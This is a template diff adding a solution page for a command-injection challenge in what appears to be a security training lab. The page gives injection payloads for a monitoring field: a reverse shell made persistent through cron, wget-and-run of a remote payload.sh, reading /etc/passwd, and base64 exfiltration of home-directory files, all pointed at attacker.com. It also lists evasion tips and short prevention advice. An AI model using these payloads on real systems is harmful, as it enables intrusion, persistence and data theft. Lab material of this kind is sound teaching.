@@ -1,0 +1,122 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Advanced Command Injection Chaining - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Advanced Command Injection Chaining</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit advanced command injection chaining techniques in a complex enterprise monitoring system.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates advanced command injection chaining in a complex enterprise monitoring system. The system processes multiple interconnected commands and configurations, allowing sophisticated chaining attacks that can compromise entire infrastructure.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Analyze system architecture:</strong> Understand how commands flow through the monitoring system.</p>
+                    </li>
+                    <li>
+                        <p><strong>Chain basic commands:</strong> Start with simple command chaining.</p>
+                        <pre class="bg-light p-3 rounded"><code>monitor_target=server1; whoami && id</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Multi-stage exploitation:</strong> Use command output as input for subsequent commands.</p>
+                        <pre class="bg-light p-3 rounded"><code>monitor_target=server1; export USER=$(whoami) && echo $USER</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Complex chaining:</strong> Chain multiple exploitation techniques.</p>
+                        <pre class="bg-light p-3 rounded"><code>monitor_target=server1; curl -X POST http://attacker.com/$(whoami) && wget http://attacker.com/payload.sh && chmod +x payload.sh && ./payload.sh</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Advanced Chaining Techniques</h3>
+                <ul>
+                    <li><code>cmd1; cmd2 && cmd3</code> - Sequential execution with conditional chaining</li>
+                    <li><code>cmd1 | cmd2 | cmd3</code> - Pipeline chaining</li>
+                    <li><code>cmd1 $(cmd2) cmd3</code> - Command substitution chaining</li>
+                    <li><code>cmd1 && (cmd2; cmd3) || cmd4</code> - Complex conditional chaining</li>
+                    <li><code>cmd1 & cmd2 & cmd3</code> - Parallel execution chaining</li>
+                </ul>
+
+                <h3 class="mt-4">Multi-Stage Attack Scenarios</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Reconnaissance Chain:</h6>
+                        <ul>
+                            <li>System information gathering</li>
+                            <li>Network discovery</li>
+                            <li>Service enumeration</li>
+                            <li>User privilege assessment</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Exploitation Chain:</h6>
+                        <ul>
+                            <li>Initial command execution</li>
+                            <li>Payload download</li>
+                            <li>Persistence establishment</li>
+                            <li>Lateral movement</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Enterprise Impact</h3>
+                <p>Advanced command injection chaining can lead to:</p>
+                <ul>
+                    <li>Complete infrastructure compromise</li>
+                    <li>Multi-system lateral movement</li>
+                    <li>Persistent backdoor installation</li>
+                    <li>Data exfiltration at scale</li>
+                    <li>Service disruption across multiple systems</li>
+                </ul>
+
+                <h3 class="mt-4">Real-World Chaining Examples</h3>
+                <pre class="bg-light p-3 rounded"><code># Information gathering chain
+monitor_target=server1; uname -a && cat /etc/passwd && ps aux && netstat -tulpn
+
+# Payload deployment chain
+monitor_target=server1; wget http://attacker.com/payload.sh && chmod +x payload.sh && ./payload.sh && rm payload.sh
+
+# Persistence chain
+monitor_target=server1; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -
+
+# Data exfiltration chain
+monitor_target=server1; find /home -name "*.txt" -exec cat {} \; | base64 | curl -X POST -d @- http://attacker.com/data</code></pre>
+
+                <h3 class="mt-4">Defense Evasion</h3>
+                <p>Advanced chaining can evade detection by:</p>
+                <ul>
+                    <li>Splitting malicious commands across multiple parameters</li>
+                    <li>Using legitimate tools for malicious purposes</li>
+                    <li>Implementing time delays between commands</li>
+                    <li>Obfuscating command syntax</li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Comprehensive Input Validation:</strong> Validate all inputs across the entire command chain</li>
+                    <li><strong>Command Monitoring:</strong> Monitor and log all executed commands</li>
+                    <li><strong>Behavioral Analysis:</strong> Implement behavioral analysis for command patterns</li>
+                    <li><strong>Least Privilege:</strong> Implement strict privilege controls</li>
+                    <li><strong>Network Segmentation:</strong> Limit lateral movement capabilities</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level23') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
